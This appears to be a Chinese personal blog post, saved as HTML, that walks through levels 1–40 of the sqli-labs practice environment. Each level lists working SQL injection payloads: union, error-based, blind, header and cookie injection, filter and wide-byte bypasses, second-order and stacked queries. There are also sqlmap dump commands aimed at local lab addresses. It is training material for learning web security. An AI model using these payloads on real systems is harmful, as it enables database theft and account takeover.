@@ -1,0 +1,716 @@
+<!DOCTYPE html>
+<html>
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
+    <meta name="author" content="明 尘">
+    
+    
+    
+    
+    
+    
+    <title>sqli通关 | 文心雕龙</title>
+    <link href="http://example.com" rel="prefetch" />
+
+    
+<link rel="stylesheet" href="/css/bootstrap.min.css">
+<link rel="stylesheet" href="/css/aos.css">
+<link rel="stylesheet" href="/css/style.css">
+
+    
+<script src="/js/jquery.min.js"></script>
+
+    
+<script src="/js/bootstrap.min.js"></script>
+
+    
+<script src="/js/aos.js"></script>
+
+    
+<script src="/js/highslide/highslide-full.min.js"></script>
+
+    
+<link rel="stylesheet" href="/js/highslide/highslide.css">
+
+    <style type="text/css">
+        @media (max-width: 768px) {
+            body {
+                background-color: #f0f0f0;
+                background: url('/imgs/xsbg.gif');
+                background-attachment: fixed;
+            }
+        }
+    </style>
+    
+    <!--<script type="text/javascript">
+      if (document.images) {
+        var avatar = new Image();
+        avatar.src = '/imgs/avatar.jpg'
+        var previews = 'preview1.jpg,preview2.jpg,preview3.jpg,preview4.jpg,preview5.jpg,preview6.jpg,preview7.jpg'.split(',')
+        var previewsPreLoad = []
+        for(var i = 0; i < length; i++) {
+          previewsPreLoad.push(new Image())
+          previewsPreLoad[previewsPreLoad.length - 1].src = '/imgs/preview' + previews[i]
+        }
+      }
+    </script>-->
+<meta name="generator" content="Hexo 7.0.0"></head>
+<body>
+    <!-- 背景轮播图功能 -->
+    <section class="hidden-xs">
+    <ul class="cb-slideshow">
+        <li><span>天若</span></li>
+        <li><span>有情</span></li>
+        <li><span>天亦老</span></li>
+        <li><span>我为</span></li>
+        <li><span>长者</span></li>
+        <li><span>续一秒</span></li>
+    </ul>
+</section>
+    <!-- 欧尼酱功能, 谁用谁知道 -->
+    
+    <header class="navbar navbar-inverse" id="gal-header">
+    <div class="container">
+        <div class="navbar-header">
+            <button type="button" class="navbar-toggle collapsed"
+                    data-toggle="collapse" data-target=".bs-navbar-collapse"
+                    aria-expanded="false">
+                <span class="fa fa-lg fa-reorder"></span>
+            </button>
+            <a href="http://example.com">
+                
+                <style>
+                    #gal-header .navbar-brand {
+                        height: 54px;
+                        line-height: 24px;
+                        font-size: 28px;
+                        opacity: 1;
+                        background-color: rgba(0,0,0,0);
+                        text-shadow: 0 0 5px #fff,0 0 10px #fff,0 0 15px #fff,0 0 20px #228DFF,0 0 35px #228DFF,0 0 40px #228DFF,0 0 50px #228DFF,0 0 75px #228DFF;
+                    }
+                </style>
+                <!-- 这里使用文字(navbar_text or config.title) -->
+                <div class="navbar-brand">文心雕龙</div>
+                
+            </a>
+        </div>
+        <div class="collapse navbar-collapse bs-navbar-collapse">
+            <ul class="nav navbar-nav" id="menu-gal">
+                
+                
+                <li class="">
+                    <a href="/">
+                        <i class="fa fa-home"></i>首页
+                    </a>
+                </li>
+                
+                
+                
+                <li class="">
+                    <a href="/archives">
+                        <i class="fa fa-archive"></i>归档
+                    </a>
+                </li>
+                
+                
+                
+                
+                <li class="dropdown">
+                    <!-- TODO 添加hover dropdown效果 -->
+                    <a href="#" class="dropdown-toggle" data-toggle="dropdown"
+                       aria-haspopup="true" aria-expanded="false" data-hover="dropdown">
+                        <i class="fa fa-list"></i>分类
+                    </a>
+                    <ul class="dropdown-menu">
+                        
+                        
+                        <li>
+                            <a href="/categories/%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8/">网络安全</a>
+                        </li>
+                        
+                        <li>
+                            <a href="/categories/web%E5%89%8D%E7%AB%AF/">web前端</a>
+                        </li>
+                        
+                        <li>
+                            <a href="/categories/php/">php</a>
+                        </li>
+                        
+                        
+                        <li>
+                            <a href="/categories">...</a>
+                        </li>
+                        
+                        
+                    </ul>
+                </li>
+                
+                
+                
+                
+                
+                <li class="dropdown">
+                    <!-- TODO 添加hover dropdown效果 -->
+                    <a href="#" class="dropdown-toggle" data-toggle="dropdown"
+                       aria-haspopup="true" aria-expanded="false" data-hover="dropdown">
+                        <i class="fa fa-tags"></i>标签
+                    </a>
+                    <ul class="dropdown-menu">
+                        
+                        
+                        <li>
+                            <a href="/tags/Linux/">Linux</a>
+                        </li>
+                        
+                        <li>
+                            <a href="/tags/%E5%9F%BA%E7%A1%80%E7%9F%A5%E8%AF%86/">基础知识</a>
+                        </li>
+                        
+                        <li>
+                            <a href="/tags/DNS%E5%9F%9F%E5%90%8D%E8%A7%A3%E6%9E%90/">DNS域名解析</a>
+                        </li>
+                        
+                        
+                        <li>
+                            <a href="/tags">...</a>
+                        </li>
+                        
+                        
+                    </ul>
+                </li>
+                
+                
+                
+                
+                <li class="">
+                    <a href="/about">
+                        <i class="fa fa-user"></i>关于我
+                    </a>
+                </li>
+                
+                
+            </ul>
+        </div>
+    </div>
+</header>
+    <div id="gal-body">
+        <div class="container">
+            <div class="row">
+                <div class="col-md-8 gal-right" id="mainstay">
+                    
+<article class="article well article-body" id="article">
+    <div class="breadcrumb">
+        <i class="fa fa-home"></i>
+        <a href="http://example.com">文心雕龙</a>
+        >
+        <span>sqli通关</span>
+    </div>
+    <!-- 大型设备详细文章 -->
+    <div class="hidden-xs">
+        <div class="title-article">
+            <h1>
+                <a href="/2024/01/08/sqli%E9%80%9A%E5%85%B3/">sqli通关</a>
+            </h1>
+        </div>
+        <div class="tag-article">
+            
+            <span class="label label-gal">
+                <i class="fa fa-calendar"></i> 2024-01-08
+            </span>
+            
+        </div>
+    </div>
+    <!-- 小型设备详细文章 -->
+    <div class="visible-xs">
+        <center>
+            <div class="title-article">
+                <h4>
+                    <a href="/2024/01/08/sqli%E9%80%9A%E5%85%B3/">sqli通关</a>
+                </h4>
+            </div>
+            <p>
+                <i class="fa fa-calendar"></i> 2024-01-08
+            </p>
+            <p>
+                
+                
+            </p>
+        </center>
+    </div>
+    <div class="content-article">
+        <h3><span id="less1">less1</span></h3><p>判断是否存在sql注入<br>输入数字值的ID作为参数，我们输入?id&#x3D;1<br>通过数字值不同返回的内容也不同，所以我们输入的内容是带入到数据库里面查询了<br>判断sql语句是否是拼接，且是字符型还是数字型。<br>联合注入<br>order by 判断列数<br>爆出显示位，就是看看表格里面那一列是在页面显示的。<br>爆库?id&#x3D;-1’union select 1,database(),version()–+<br>爆表?id&#x3D;-1’union select 1,2,group_concat(table_name) from information_schema.tables where table_schema&#x3D;’security’–+<br>爆字段名?id&#x3D;-1’union select 1,2,group_concat(column_name) from information_schema.columns where table_name&#x3D;’users’–+<br>爆账户和密码。?id&#x3D;-1’ union select 1,2,group_concat(username ,id , password) from users–+</p>
+<h3><span id="less2">less2</span></h3><p>判断注入<br>id&#x3D;1正常，id&#x3D;1’错误 ，id&#x3D;1’’错误<br>order by 3正常 order by 4错误<br>判断回显点union select 1，2，3<br>爆用户名和密码?id&#x3D;-1 union select 1,group_concat(id,username,password),3 from users;–+</p>
+<h3><span id="less3">less3</span></h3><p>判断注入<br>id&#x3D;1正常，id&#x3D;1’错误，id&#x3D;1’）正常<br>回显点2<br>爆用户名和密码?id&#x3D;-1’) union select 1,group_concat(id,username,password),3 from users;–+</p>
+<h3><span id="less4">less4</span></h3><p>判断注入<br>闭合点”)双引号加括号.<br>回显点2<br>爆用户名和密码?id&#x3D;-1”) union select 1,group_concat(id,username,password),3 from users;–+<br>–+</p>
+<h3><span id="less5">less5</span></h3><p>对于请求对错出现不一样页面其余的就没有了。这个时候我们用联合注入就没有用，<br>可以选择布尔盲注或者使用报错函数<br>id&#x3D;1’,<br>查用户?id&#x3D;1’ and (updatexml(1,concat(0x7e,(select user()),0x7e),1));–+<br>爆库?id&#x3D;1’ and (updatexml(1,concat(0x7e,(select database()),0x7e),1));–+<br>爆用户名和密码?id&#x3D;1’ and (updatexml(1,concat(0x7e,(select group_concat(username,password) from users),0x7e),1));–+</p>
+<h3><span id="less6">less6</span></h3><p>与less5一样，less5是’  less6是”<br>id&#x3D;1’’<br>查用户?id&#x3D;1” or (updatexml(1,concat(0x7e,(select user()),0x7e),1));–+<br>爆库?id&#x3D;1” or (updatexml(1,concat(0x7e,(select database()),0x7e),1));–+<br>爆用户名和密码?id&#x3D;1” or (updatexml(1,concat(0x7e,(select group_concat(username,password) from users),0x7e),1));–+</p>
+<h3><span id="less7">less7</span></h3><p>id&#x3D;1,页面显示You are in…. Use outfile……<br>id&#x3D;1’报错，根据提示应该为’)<br>id&#x3D;1’))<br>使用bool盲注脚本，</p>
+<h3><span id="less8">less8</span></h3><p>id&#x3D;1，显示You are in….<br>id&#x3D;1’<br>使用bool盲注</p>
+<h3><span id="less9">less9</span></h3><p>无论是单引号还是双引号以及order by 都无法报错<br>使用?id&#x3D;1’ and sleep(5)–+<br>有5秒延迟，说明可以注入<br>使用时间盲注</p>
+<h3><span id="less10">less10</span></h3><p>进行输入判断，将单引号改成双引号<br>和less一样使用时间注入</p>
+<h3><span id="less11">less11</span></h3><p>页面变成表单形式，应该是post请求<br>参数是在表单里面。我们可以直接在输入框进行注入就行。并且参数不在是一个而是两个。<br>username&#x3D;参数 and password&#x3D;参数<br>输入1’根据报错信息推断该sql语句username&#x3D;’参数’ and password&#x3D;’参数’<br>使用–+注释就不行，需要换成#<br>输入1’ or  1&#x3D;1  出现了结果Your Login name:Dumb Your Password:Dumb<br>根据提示信息，可以判断回显<br>1’ union select 1,2#<br>可以爆数据了<br>1’ union select 1,group_concat(id,username,password) from users;#</p>
+<h3><span id="less12">less12</span></h3><p>用户栏输入1，根据显示应该是双引号加括号<br>输入1”)  #没有报错<br>判断回显1”) union select 1,2#<br>报数据<br>1”) union select 1,group_concat(id,username,password) from users;#</p>
+<h3><span id="less13">less13</span></h3><p>根据提示，将双引号改成单引号，<br>1’) union select 1,2#没有显示，没有反应<br>尝试使用报错函数<br>爆用户1’) union (updatexml(1,concat(0x7e,(select user()),0x7e),1));#<br>爆库1’) or (updatexml(1,concat(0x7e,(select database()),0x7e),1));#<br>爆用户名和密码1’) or (updatexml(1,concat(0x7e,(select group_concat(username,password) from users),0x7e),1));#</p>
+<h3><span id="less14">less14</span></h3><p>输入1，根据提示就是双引号<br>1” union select 1,2#没有反应<br>用报错函数，和less13差不多，将单引号加括号改成双引号<br>爆用户名和密码1” or (updatexml(1,concat(0x7e,(select group_concat(username,password) from users),0x7e),1));#</p>
+<h3><span id="less15">less15</span></h3><p>参数中添加引号，页面不显示数据库的报错信息，报错注入无法使用。<br>利用延时注入进行,正确的时候可以直接登录，不正确的时候这里会延时 5 秒。<br>使用睡眠盲注用sqlmap<br>sqlmap -u “<a target="_blank" rel="noopener" href="http://192.168.2.64/sqli/Less-15/">http://192.168.2.64/sqli/Less-15/</a>“ –data “uname&#x3D;admin&amp;passwd&#x3D;11&amp;submit&#x3D;Submit” –dump</p>
+<h3><span id="less16">less16</span></h3><p>跟15关差不多使用睡眠注入，可用sqlmap<br>–data “uname&#x3D;admin&amp;passwd&#x3D;11&amp;submit&#x3D;Submit” -T users –dump<br>也可使用睡眠注入脚本</p>
+<h3><span id="less17">less17</span></h3><p>使用单引号发现被转义了<br>1’ or 1&#x3D;1#变成了 ‘1&#39; or 1&#x3D;1#’<br>提示密码重设置，应该是密码的位置<br>使用YAKIT抓包，在密码的位置注入<br>uname&#x3D;admin&amp;passwd&#x3D;admin’and (updatexml(1,concat(0x7e,(select database()),0x7e),1));#&amp;submit&#x3D;Submit爆出数据库<br>使用sqlmap语句sqlmap -u “<a target="_blank" rel="noopener" href="http://192.168.2.30/sqli/Less-17/">http://192.168.2.30/sqli/Less-17/</a>“ –data “uname&#x3D;admin&amp;passwd&#x3D;admin&amp;submit&#x3D;Submit” –batch -D security –tables<br>爆出数据表<br>在表单用户输入admin，密码输入1’ and (updatexml(1,concat(0x7e,(select database()),0x7e),1))#爆出数据库</p>
+<h3><span id="less18">less18</span></h3><p>提示Your IP ADDRESS is: 192.168.2.30<br>输入万用密码，提示Your User Agent is: Mozilla&#x2F;5.0 (Windows NT 10.0; Win64; x64; rv:120.0) Gecko&#x2F;20100101 Firefox&#x2F;120.0<br>页面返回了数据包user-agent的信息，那么在请求头中就可能存在注入点<br>利用yakit抓包在User-Agent末尾输入报错函数’and updatexml(1,concat(0x7e,database(),0x7e),1),1,1)#爆出数据库</p>
+<h3><span id="less19">less19</span></h3><p>用万用密码登录显示Your Referer is: <a target="_blank" rel="noopener" href="http://192.168.2.30/sqli/Less-19/">http://192.168.2.30/sqli/Less-19/</a><br>说明在数据包头referer位置有注入点<br>在referer处输入报错但要注意插入的列数<br>0’and updatexml(1,concat(0x7e,database(),0x7e),1),1)#</p>
+<h3><span id="less20">less20</span></h3><p>登录之后发现有很明显的cookie提示<br>登录之后刷新页面，一定要保证cookie还在存在的前提下进行抓包<br>利用uname&#x3D;admin’ order by 4#判断字段<br>爆库Cookie: uname&#x3D;admin’ union select 1,count(*),concat(0x7e,(select database()),0x7e,floor(rand(0)*2))x from information_schema.tables group by x#<br>uname&#x3D;admin’and updatexml(1,concat(0x7e,database(),0x7e),1)#<br>爆密码 uname&#x3D;admin’and updatexml(1,concat(0x7e,(select group_concat(id,”<del>“,username,”</del>“,password) from users),0x7e),1)#</p>
+<h3><span id="less21">less21</span></h3><p>用admin登录，在用yakt抓包发现信息被加密了<br>在HTTP协议中，Cookie传参加密通常使用Base64编码或自定义的加密算法。<br>先将语句进行base64加密，再进行注入，通过回显找到闭合方式为’)<br>admin’ and 1&#x3D;1 order by 4#  加密 YWRtaW4nIGFuZCAxPTEgb3JkZXIgYnkgNCM&#x3D;<br>爆库admin’) and updatexml(1,concat(0x7e,(select database()),0x7e),1)#<br>base64加密<br>YWRtaW4nKSBhbmQgdXBkYXRleG1sKDEsY29uY2F0KDB4N2UsKHNlbGVjdCBkYXRhYmFzZSgpKSwweDdl<br>KSwxKSM</p>
+<h3><span id="less22">less22</span></h3><p>先将语句进行base64加密，再进行注入，通过回显找到闭合方式为”<br>admin” and 1&#x3D;1 order by 4#  加密YWRtaW4iIGFuZCAxPTEgb3JkZXIgYnkgNCM&#x3D;<br>爆库admin”) and updatexml(1,concat(0x7e,(select database()),0x7e),1)#<br>加密YWRtaW4iIGFuZCB1cGRhdGV4bWwoMSxjb25jYXQoMHg3ZSwoc2VsZWN0IGRhdGFiYXNlKCkpLDB4N2UpLDEpIw&#x3D;&#x3D;</p>
+<h3><span id="less23">less23</span></h3><p>为字符型注入，并且注释符被过滤了，在回显中没有出现<br>使用报错函数<br>id&#x3D;-1’ or updatexml(1,concat(0x7e,(select database()),0x7e),1) and ‘1’&#x3D;’1<br>使用sqlmap<br>sqlmap  -u “<a target="_blank" rel="noopener" href="http://192.168.2.30/sqli/Less-23/?id=1">http://192.168.2.30/sqli/Less-23/?id=1</a>“  –batch -D security -T users -C “id,username” –dump</p>
+<h3><span id="less24">less24</span></h3><p>二次注入：二次注入是存储型注入，可以理解为构造恶意数据存储在数据库后，恶意数据被读取并进入<br>到了SQL查询语句所导致的注入。恶意数据插入到数据库时被处理的数据又被还原并存储在数据库中，<br>当Web程序调用存储在数据库中的恶意数据并执行SQL查询时，就发生了SQL二次注入。简言之就是将<br>脏数据进行简单过滤后开发者就认为该数据可信便存入数据库中，当下一次调用该数据时，该数据就会<br>拼接到其他查询语句中造成注入。<br>点右边进行注册，admin’# 密码随便<br>注册后登录，修改密码依次输入admin  密码 密码<br>然后就可以用管理员账号登录admin 123 登录成功</p>
+<h3><span id="less25">less25</span></h3><p>and和or都被过滤了，大写也被过滤了<br>将or变成oorr,这样后台过滤了or还剩下or或者用||代替or &amp;&amp;代替and<br>爆破数据库名<br>?id&#x3D;-1’ oorr updatexml(1,concat(0x7e,(select database()),0x7e),1)–+<br>?id&#x3D;-1’ || updatexml(1,concat(0x7e,(select database()),0x7e),1)–+<br>sqlmap<br>sqlmap  -u “<a target="_blank" rel="noopener" href="http://192.168.2.30/sqli/Less-25/?id=1">http://192.168.2.30/sqli/Less-25/?id=1</a>“  –batch -D security -T users -C “id,username” –dump</p>
+<h3><span id="less25a">less25a</span></h3><p>数字型注入,联合查询<br>?id&#x3D;-1 union select 1,2,group_concat(concat(id,username,passwoorrd))from<br>security.users–+<br>sqlmap<br>sqlmap  -u “<a target="_blank" rel="noopener" href="http://192.168.2.36/sqli/Less-25a/?id=1">http://192.168.2.36/sqli/Less-25a/?id=1</a>“  –batch -D security -T users -C “id,username” –dump</p>
+<h3><span id="less26">less26</span></h3><p>and or ——&gt; &amp;&amp; ||</p>
+<p>– ——&gt; 闭合逃逸</p>
+<p>&#x2F;s ——&gt; 括号<br>爆库?id&#x3D;-1’||updatexml(1,concat(0x7e,(select(database())),0x7e),1)||’1’&#x3D;’1<br>爆内容?id&#x3D;-1’||updatexml(1,concat(0x7e,(select(group_concat(concat_ws(username,0x3a,passwoorrd)))from(security.users)),0x7e),1)||’1’&#x3D;’1</p>
+<h3><span id="less26a">less26a</span></h3><p>less26a过滤的东西与less26一致，闭合方式为单引号,并且没有报错的回显<br>sqlmap -u “<a target="_blank" rel="noopener" href="http://192.168.2.36/sqli/Less-26a/?id=1">http://192.168.2.36/sqli/Less-26a/?id=1</a>“ -p id –dbms&#x3D;MySQL –tamper&#x3D;”2” –dbs –batch<br>tamper，一个2.py的文件，自己编写绕过。</p>
+<h3><span id="less27">less27</span></h3><p>过滤了select和union,不能用联合查询<br>爆内容?id&#x3D;1’or(updatexml(1,concat(0x7e,(selselecselecttect(group_concat(password,username))from(users))),1))or’0</p>
+<h3><span id="less27a">less27a</span></h3><p>盲注</p>
+<h3><span id="less28">less28</span></h3><p>过滤了注释符空格还过滤了union和select。<br>\s表示空格，+表示匹配一次或多次，&#x2F;i表示不区分大小写<br>%09 TAB键（水平）、%0a 新建一行、%0c 新的一页、%0d return功能、%0b TAB键（垂直）、%a0 空格</p>
+<p>?id&#x3D;0’)uni union%0Aselecton%0Aselect%0A1,2,group_concat(table_name)from%0Ainformation_schema.tables%0Awhere%0Atable_schema&#x3D;’security’and (‘1<br>  爆表</p>
+<h3><span id="less28a">less28a</span></h3><p>只过滤union+select。其他没有过滤。<br>爆字段?id&#x3D;0’)uniunion selecton select 1,2,group_concat(column_name)from information_schema.columns where table_schema&#x3D;’security’ and table_name&#x3D;’users’–+<br>爆账号密码 ?id&#x3D;0’)uniunion selecton select 1,2,group_concat(id,username,password)from users–+</p>
+<h3><span id="less29">less29</span></h3><p>对输入的参数进行校验是否为数字<br>sql语句在接受相同参数时候接受的是后面的参数值。<br>?id&#x3D;1&amp;id&#x3D;-2%27%20union%20select%201,group_concat(table_name),3%20from%20information_schema.tables%20where%20table_schema&#x3D;database()–+     爆表<br>?id&#x3D;1&amp;id&#x3D;-2%27%20union%20select%201,group_concat(column_name),3%20from%20information_schema.columns%20where%20table_schema&#x3D;database() and table_name&#x3D;’users’–+   爆字段<br>?id&#x3D;1&amp;id&#x3D;-2%27%20union%20select%201,group_concat(password,username),3%20from%20users–+<br>爆密码账户</p>
+<h3><span id="less30">less30</span></h3><p>闭合为双引号<br>?id&#x3D;1&amp;id&#x3D;-1”%20union%20select%201,group_concat(password,username),3%20from%20users–+</p>
+<h3><span id="less31">less31</span></h3><p>闭合为”)双引号加括号<br>?id&#x3D;1&amp;id&#x3D;-1”)%20union%20select%201,group_concat(password,username),3%20from%20users–+</p>
+<h3><span id="less32">less32</span></h3><p>preg_replace函数将 斜杠，单引号和双引号过滤了<br>闭合点是单引号<br>采用宽字节注入。%df<br>?id&#x3D;-1%df%27%20union%20select%201,database(),3%20–+爆库<br>?id&#x3D;-1%df%27%20union%20select%201,group_concat(table_name),3%20from%20information_schema.tables%20where%20table_schema&#x3D;database()–+     爆表<br>?id&#x3D;-1%df%27%20union%20select%201,group_concat(column_name),3%20from%20information_schema.columns%20where%20table_schema&#x3D;database() and table_name&#x3D;0x7573657273–+   爆字段<br>?id&#x3D;-1%df%27%20union%20select%201,group_concat(password,username),3%20from%20users–+爆密码</p>
+<h3><span id="less33">less33</span></h3><p>闭合点是单引号，宽字节注入%df<br>?id&#x3D;-1%df%27%20union%20select%201,group_concat(database()),3–+爆库</p>
+<h3><span id="less34">less34</span></h3><p>可以使用十六进制编码绕过，但是需要使用三个字节<br>报错uname&#x3D;汉’ or updatexml(1,concat(0x7e,database(),0x7e),1)–<br>+&amp;passwd&#x3D;admin&amp;submit&#x3D;Submit<br>联合注入yakit抓包<br>uname&#x3D;汉’ union select 1,database()–+&amp;passwd&#x3D;&amp;submit&#x3D;Submit</p>
+<h3><span id="less35">less35</span></h3><p>数字型注，将表名换成十六进制编码，直接使用联合查询<br>?id&#x3D;-1%20union%20select%201,group_concat(table_name),3%20from%20information_schema.tables%20where%20table_schema&#x3D;database()–+     爆表<br>?id&#x3D;-1%20union%20select%201,group_concat(column_name),3%20from%20information_schema.columns%20where%20table_schema&#x3D;database() and table_name&#x3D;0x7573657273–+   爆字段<br>?id&#x3D;-1%20union%20select%201,group_concat(password,username),3%20from%20users–+</p>
+<h3><span id="less36">less36</span></h3><p>宽字节注入<br>preg_replace函数将 斜杠，单引号和双引号过滤了，闭合为单引号<br>?id&#x3D;-1%df%27%20union%20select%201,group_concat(password,username),3%20from%20users–+</p>
+<h3><span id="less37">less37</span></h3><p>mysql_real_escape_string函数对于账户和密码都进行转义，使用宽字节注入<br>报错汉’ or updatexml(1,concat(0x7e,database(),0x7e),1)#<br>抓包在unamen处注入uname&#x3D;1%df’ union select 1,group_concat(column_name) from information_schema.columns where table_schema&#x3D;database() and table_name&#x3D;0x7573657273–+&amp;passwd&#x3D;&amp;submit&#x3D;Submit<br>uname&#x3D;1%df’ union select 1,group_concat(password,username) from users–+&amp;passwd&#x3D;&amp;submit&#x3D;Submit</p>
+<h3><span id="less38">less38</span></h3><p>mysqli_multi_query()这个函数可以实现针对数据库一条或多多条数据的操作，这就导致可能产生堆叠<br>注入的存在，堆叠注入的危害比普通爆破更为强烈,可以实现数据的增删改查，木马的写入，甚至直接破<br>环升格数据库<br>例如插入一条数据在users字段中,两条不同sql语句用分号隔开<br>?id&#x3D;1’;insert into users(username,password)values(‘ikun’,’jinitaimei’)–+<br>数据插入后页面没有回显，通过查询查看<br>?id&#x3D;-1’ union select 1,2,(select group_concat(username,0x7e,password)from<br>users)–+<br>查字段<br>?id&#x3D;-1’ union select 1,2,(select group_concat(table_name) from information_schema.tables where table_schema&#x3D;database())b–+</p>
+<h3><span id="less39">less39</span></h3><p>注入方式为数字型注入，依旧存在堆叠注入，正常联合注入也行<br>联合注入?id&#x3D;-1%20union%20select%201,group_concat(username,password),3%20from%20users</p>
+<h3><span id="less40">less40</span></h3><p>测试发现闭合方式为’)。依旧存在堆叠注入<br>单引号加括号闭合，然后使用联合注入就可以了<br>?id&#x3D;-1%27)%20union%20select%201,group_concat(table_name),3%20from%20information_schema.tables%20where%20table_schema&#x3D;database()–+<br>?id&#x3D;-1%27)%20union%20select%201,group_concat(username,password),3%20from%20users%20–+爆信息<br>利用堆叠注入修改Dumb账户的密码<br>?id&#x3D;1’);update security.users set password&#x3D;’IKUN’ where username&#x3D;’Dumb’–+</p>
+
+    </div>
+</article>
+
+
+                </div>
+                <aside class="col-md-4 gal-left" id="sidebar">
+    <!-- 此为sidebar的搜索框, 非搜索结果页面 -->
+<aside id="sidebar-search">
+    <div class="search hidden-xs" data-aos="fade-up" data-aos-duration="2000">
+        <form class="form-inline clearfix" id="search-form" method="get"
+              action="/search/index.html">
+            <input type="text" name="s" class="form-control" id="searchInput" placeholder="搜索文章~" autocomplete="off">
+            <button class="btn btn-danger btn-gal" type="submit">
+                <i class="fa fa-search"></i>
+            </button>
+        </form>
+    </div>
+</aside>
+    <aside id="sidebar-author">
+    <div class="panel panel-gal" data-aos="flip-right" data-aos-duration="3000">
+        <div class="panel-heading" style="text-align: center">
+            <i class="fa fa-quote-left"></i>
+            明 尘
+            <i class="fa fa-quote-right"></i>
+        </div>
+        <div class="author-panel text-center">
+            <img src="/imgs/avatar.jpg" width="140" height="140"
+                 alt="个人头像" class="author-image">
+            <p class="author-description"></p>
+        </div>
+    </div>
+</aside>
+    
+    <aside id="sidebar-recent_comments">
+    <div class="panel panel-gal recent hidden-xs" data-aos="fade-up" data-aos-duration="2000">
+        <div class="panel-heading">
+            <i class="fa fa-comments"></i>
+            最新评论
+            <i class="fa fa-times-circle panel-remove"></i>
+            <i class="fa fa-chevron-circle-up panel-toggle"></i>
+        </div>
+        <ul class="list-group list-group-flush"></ul>
+    </div>
+</aside>
+    
+    <!-- 要配置好leancloud才能开启此小工具 -->
+    
+    
+    <aside id="sidebar-recent_posts">
+    <div class="panel panel-gal recent hidden-xs" data-aos="fade-up" data-aos-duration="2000">
+        <div class="panel-heading">
+            <i class="fa fa-refresh"></i>
+            近期文章
+            <i class="fa fa-times-circle panel-remove"></i>
+            <i class="fa fa-chevron-circle-up panel-toggle"></i>
+        </div>
+        <ul class="list-group list-group-flush">
+            
+            <li class="list-group-item">
+                <span class="post-title">
+                    <a href="/2024/01/08/sqli%E9%80%9A%E5%85%B3/">sqli通关</a>
+                </span>
+            </li>
+            
+            <li class="list-group-item">
+                <span class="post-title">
+                    <a href="/2024/01/08/tg%E6%B3%A8%E5%86%8C%E5%92%8C%E6%B0%B8%E6%81%92%E4%B9%8B%E9%BB%91/">tg注册和永恒之黑</a>
+                </span>
+            </li>
+            
+            <li class="list-group-item">
+                <span class="post-title">
+                    <a href="/2024/01/07/%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86/">信息收集</a>
+                </span>
+            </li>
+            
+            <li class="list-group-item">
+                <span class="post-title">
+                    <a href="/2024/01/04/virtual%E5%92%8Cpicachu/">virtual和pikachu</a>
+                </span>
+            </li>
+            
+            <li class="list-group-item">
+                <span class="post-title">
+                    <a href="/2024/01/02/%E6%B8%97%E9%80%8F%E5%92%8C%E9%9D%B6%E6%9C%BA/">渗透和靶机</a>
+                </span>
+            </li>
+            
+            <li class="list-group-item">
+                <span class="post-title">
+                    <a href="/2024/01/01/sqlmap/">sqlmap</a>
+                </span>
+            </li>
+            
+            <li class="list-group-item">
+                <span class="post-title">
+                    <a href="/2024/01/01/waf%E5%92%8CBP/">waf和BP</a>
+                </span>
+            </li>
+            
+            <li class="list-group-item">
+                <span class="post-title">
+                    <a href="/2023/12/27/sql%E7%BB%95%E8%BF%87/">T1</a>
+                </span>
+            </li>
+            
+            <li class="list-group-item">
+                <span class="post-title">
+                    <a href="/2023/12/22/python3/">python3</a>
+                </span>
+            </li>
+            
+            <li class="list-group-item">
+                <span class="post-title">
+                    <a href="/2023/12/21/sql%E6%B3%A8%E5%85%A52/">sql注入2</a>
+                </span>
+            </li>
+            
+        </ul>
+    </div>
+</aside>
+    
+    
+    <aside id="sidebar-rand_posts">
+    <div class="panel panel-gal recent hidden-xs" data-aos="fade-up" data-aos-duration="2000">
+        <div class="panel-heading">
+            <i class="fa fa-refresh"></i>
+            随机文章
+            <i class="fa fa-times-circle panel-remove"></i>
+            <i class="fa fa-chevron-circle-up panel-toggle"></i>
+        </div>
+        <ul class="list-group list-group-flush">
+            
+            
+            <li class="list-group-item">
+                <span class="post-title">
+                    <a href="/2023/12/02/Linux%E5%91%BD%E4%BB%A4/">Linux命令</a>
+                </span>
+            </li>
+            
+            <li class="list-group-item">
+                <span class="post-title">
+                    <a href="/2023/12/16/php%E5%AE%9E%E6%93%8D/">php实操</a>
+                </span>
+            </li>
+            
+            <li class="list-group-item">
+                <span class="post-title">
+                    <a href="/2023/12/06/python%E5%AD%A6%E4%B9%A0/">python学习</a>
+                </span>
+            </li>
+            
+            <li class="list-group-item">
+                <span class="post-title">
+                    <a href="/2023/12/09/python%E5%AD%A6%E4%B9%A01/">python列表元组</a>
+                </span>
+            </li>
+            
+            <li class="list-group-item">
+                <span class="post-title">
+                    <a href="/2024/01/08/tg%E6%B3%A8%E5%86%8C%E5%92%8C%E6%B0%B8%E6%81%92%E4%B9%8B%E9%BB%91/">tg注册和永恒之黑</a>
+                </span>
+            </li>
+            
+            <li class="list-group-item">
+                <span class="post-title">
+                    <a href="/2023/12/19/sql%E6%B3%A8%E5%85%A51/">sql注入1</a>
+                </span>
+            </li>
+            
+            <li class="list-group-item">
+                <span class="post-title">
+                    <a href="/2024/01/04/virtual%E5%92%8Cpicachu/">virtual和pikachu</a>
+                </span>
+            </li>
+            
+            <li class="list-group-item">
+                <span class="post-title">
+                    <a href="/2024/01/07/%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86/">信息收集</a>
+                </span>
+            </li>
+            
+            <li class="list-group-item">
+                <span class="post-title">
+                    <a href="/2024/01/02/%E6%B8%97%E9%80%8F%E5%92%8C%E9%9D%B6%E6%9C%BA/">渗透和靶机</a>
+                </span>
+            </li>
+            
+            <li class="list-group-item">
+                <span class="post-title">
+                    <a href="/2023/12/05/%E7%BD%91%E7%BB%9C%E5%9F%BA%E7%A1%80%E7%9F%A5%E8%AF%86%E5%AD%A6%E4%B9%A0/">网络基础知识学习</a>
+                </span>
+            </li>
+            
+        </ul>
+    </div>
+</aside>
+    
+    
+    <aside id="gal-sets">
+        <div class="panel panel-gal hidden-xs" data-aos="fade-up" data-aos-duration="2000">
+            <ul class="nav nav-pills pills-gal">
+
+                
+                <li>
+                    <a href="/2024/01/08/sqli%E9%80%9A%E5%85%B3/index.html#sidebar-tags" data-toggle="tab" id="tags-tab">热门标签</a>
+                </li>
+                
+                
+                <li>
+                    <a href="/2024/01/08/sqli%E9%80%9A%E5%85%B3/index.html#sidebar-friend-links" data-toggle="tab" id="friend-links-tab">友情链接</a>
+                </li>
+                
+                
+                <li>
+                    <a href="/2024/01/08/sqli%E9%80%9A%E5%85%B3/index.html#sidebar-links" data-toggle="tab" id="links-tab">个人链接</a>
+                </li>
+                
+            </ul>
